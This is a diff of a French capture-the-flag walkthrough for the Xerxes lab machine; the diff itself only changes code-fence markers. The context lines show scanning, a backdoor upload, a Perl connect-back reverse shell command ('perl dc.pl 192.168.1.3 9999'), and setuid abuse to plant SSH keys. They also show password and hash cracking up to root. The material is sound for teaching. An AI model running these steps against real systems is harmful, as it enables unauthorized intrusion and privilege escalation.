@@ -24,7 +24,7 @@ Let's go !
 
 On démarre le système qui est une *Debian 7* avec un kernel 3.2.  
 
-```plain
+```
 nmap -A -T4 192.168.1.39
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-05 18:48 CET
@@ -136,7 +136,7 @@ On change l'extension de notre backdoor en *.yo* et l'upload passe nickel.
 
 Maintenant ce serait bien d'avoir un shell, même s'il est basique. Alors on upload la backdoor Perl connect-back de *Data Cha0s* puis on la lance de cette manière :  
 
-```plain
+```
 perl dc.pl 192.168.1.3 9999
 ```
 
@@ -150,7 +150,7 @@ On ne trouve rien d'intéressant dans la *crontab* ou dans les ports en écout
 
 Dans le /home on trouve 3 utilisateurs :
 
-```plain
+```
 ls -l /home  
 total 12
 drwxr-xr-x 3 amanpour  amanpour  4096 Dec 19 01:15 amanpour
@@ -160,7 +160,7 @@ drwxr-x--- 3 delacroix delacroix 4096 Dec 24 01:34 delacroix
 
 Avec nos droits courants, seul le dossier amanpour peut nous intéresser. Voici le contenu de son dossier :
 
-```plain
+```
 -rwxr--r-- 1 amanpour amanpour  270 Dec 19 01:28 .bash_history
 -rw-r--r-- 1 amanpour amanpour  220 Dec 17 23:31 .bash_logout
 -rw-r--r-- 1 amanpour amanpour 3433 Dec 19 01:27 .bashrc
@@ -174,7 +174,7 @@ drwx------ 2 amanpour amanpour 4096 Dec 19 01:15 .ssh
 
 Et le contenu de son historique :
 
-```plain
+```
 file qr
 python steqr.py -f qr -s hehehehe
 python steqr.py -f qr-enc.png
@@ -190,7 +190,7 @@ Le fichier *qr* est une image PNG et le fichier *steqr.py* est le script qui ge�
 
 A quoi correspond la chaine base64 une fois décodée ?
 
-```plain
+```
 ++++++[>++++++++<-]>++++.+.----.-..
 ```
 
@@ -198,7 +198,7 @@ Les amateurs de langages de programmation ésotériques auront tout de suite r
 
 Utilisons *steqr.py* pour savoir ce que le fichier *newpassword* recèle (je ne met pas la source car elle prendrait trop de place mais on utilise -s pour encoder et -f pour décoder) :  
 
-```plain
+```
 python steqr.py -f newpassword
 b56d9d8b6077fb56127d1c8ff84ece11
 ```
@@ -212,7 +212,7 @@ Alpinisme Unix
 
 Maintenant qu'on a notre shell SSH voyons si on peut réaliser une escalade de privilèges. Ce cher *amanpour* fait partie d'un group baptisé *"notes"*.
 
-```plain
+```
 amanpour@xerxes:~$ id
 uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(notes)
 amanpour@xerxes:~$ grep notes /etc/group
@@ -221,13 +221,13 @@ notes:x:1003:amanpour,curtiz
 
 C'est visiblement notre point d'entrée car *curtiz* en fait aussi partie. Avec une petite recherche de fichiers :
 
-```plain
+```
 find / -group notes 2> /dev/null
 ```
 
 on trouve deux fichiers appartenant à curtiz dont l'un est setuid :
 
-```plain
+```
 -rwsr-s--x 1 curtiz notes 5111 Dec 18 05:59 /opt/notes
 -rwxr-x--- 1 curtiz notes 1343 Dec 19 00:47 /opt/notes.py
 ```
@@ -252,7 +252,7 @@ Le format est plutôt simple et on a pas besoin de spécifier quelque part la 
 
 On voit que l'on dispose de l'uid effectif de *curtiz* mais pas de son uid réel :'( Il faut donc qu'on tape juste à la première commande. On va créer une clé SSH depuis le compte *amanpour* et l'autoriser pour *curtiz* :
 
-```plain
+```
 bash-4.2$ id
 uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(notes)
 bash-4.2$ ssh-keygen -t rsa
@@ -310,7 +310,7 @@ Dans le home de *curtiz* on retrouve immédiatement un fichier *id\_rsa* qui co
 
 Qui est *Marie* ? Un petit grep pour nous renseigner :
 
-```plain
+```
 a.curtiz@xerxes:~$ grep -i marie /etc/passwd
 delacroix:x:1000:1000:Marie Delacroix,,,:/home/delacroix:/bin/delacroix
 ```
@@ -321,7 +321,7 @@ Si on lance le binaire on a une demande de mot de passe. C'est le niveau de sé
 
 Le binaire est lisible pour tous. *Ltrace* n'est pas installé (ce qui aurait pu faciliter l'analyse) mais de toute façon quand on lance un strings dessus on obtient :
 
-```plain
+```
 %02x
 3d054afb77714ca938d8bca104fcb141
 /bin/bash
@@ -330,7 +330,7 @@ Password:
 
 On retourne sur *MD5RDB* et on rentre le hash : le password complémentaire est *VonBraun*. On se connecte au compte *delacroix* en utilisant la clé :
 
-```plain
+```
 curtiz@xerxes:~$ ssh -i id_rsa delacroix@localhost
 Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
 Last login: Tue Dec 24 01:36:34 2013 from 192.168.56.1
@@ -347,7 +347,7 @@ Dans le home de l'utilisatrice, deux scripts shell : *check.sh* et *generate.sh*
 
 Son historique :
 
-```plain
+```
 whoami
 id
 sudo su
@@ -382,7 +382,7 @@ La séquence *date | awk '{print $4}'* récupère l'heure en cours, par exemp
 
 Si on lance un *stat* sur *.last* on obtient :
 
-```plain
+```
   File: `.last'
   Size: 0               Blocks: 0          IO Block: 4096   regular empty file
 Device: 801h/2049d      Inode: 45529       Links: 1
@@ -395,14 +395,14 @@ Change: 2013-12-19 00:19:51.024911360 -0800
 
 Par conséquent le mot de passe du root doit être
 
-```plain
+```
 delacroix@xerxes:/home/delacroix$ echo 00:19:51 | md5sum | awk '{print $1}'
 6cf49e97c915079e27c09d41da9d95e4
 ```
 
 On se connecte via *sudo su* comme elle le faisait puis on copie le flag dans le dossier d'upload du début pour pouvoir y accéder :
 
-```plain
+```
 delacroix@xerxes:/home/delacroix$ sudo su
 [sudo] password for delacroix: 
 root@xerxes:/home/delacroix# id
